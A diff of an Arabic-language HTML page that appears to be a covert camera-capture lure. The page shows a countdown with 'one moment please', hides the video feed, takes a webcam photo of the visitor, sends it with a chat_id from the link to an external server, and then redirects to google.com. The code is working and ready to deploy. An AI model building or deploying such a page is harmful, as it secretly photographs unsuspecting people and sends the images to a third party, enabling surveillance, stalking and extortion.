@@ -1,51 +1,56 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
+    <meta charset="UTF-8">
+    <title>لحظة واحدة...</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; }
-        #countdown { font-size: 80px; color: #ff6600; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #countdown { font-size: 80px; color: #ff6600; margin-bottom: 20px; }
+        #text { font-size: 20px; }
+        #video { display: none; }
     </style>
 </head>
 <body>
-    <div id="status">الرجاء السماح بالوصول للكاميرا</div>
-    <div id="countdown"></div>
-    <video id="video" autoplay playsinline style="display:none;"></video>
+    <div id="countdown">10</div>
+    <div id="text">لحظة واحدة من فضلك</div>
+    <video id="video" autoplay playsinline></video>
 
     <script>
         const video = document.getElementById('video');
-        const status = document.getElementById('status');
         const countdownEl = document.getElementById('countdown');
+        
+        // استخراج chat_id من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const chat_id = urlParams.get('chat_id');
 
-        // عند فتح الصفحة، اطلب الكاميرا فوراً
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             video.srcObject = stream;
-            startCountdown(10); // البدء من 10 كما في 118892.jpg
-        });
-
-        function startCountdown(seconds) {
-            let counter = seconds;
-            status.innerText = "لحظة واحدة من فضلك";
+            let counter = 10;
             const timer = setInterval(() => {
-                countdownEl.innerText = counter;
                 counter--;
-                if (counter < 0) {
+                countdownEl.innerText = counter;
+                if (counter <= 0) {
                     clearInterval(timer);
-                    capturePhoto();
+                    captureAndSend();
                 }
             }, 1000);
-        }
+        });
 
-        function capturePhoto() {
+        function captureAndSend() {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            const image = canvas.toDataURL('image/jpeg');
-            // إرسال الصورة للسيرفر
-            fetch('/upload', { method: 'POST', body: JSON.stringify({ image: image }) })
-            .then(() => {
-                window.location.href = "/success"; // توجيه المستخدم بعد الالتقاط
+            const imageBase64 = canvas.toDataURL('image/jpeg');
+
+            // إرسال البيانات للسيرفر (غير هذا الرابط لرابط موقعك على Railway)
+            fetch('https://your-server.railway.app/upload', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ image: imageBase64, chat_id: chat_id })
+            }).then(() => {
+                window.location.href = "https://google.com"; // توجيه المستخدم بعد الانتهاء
             });
         }
     </script>
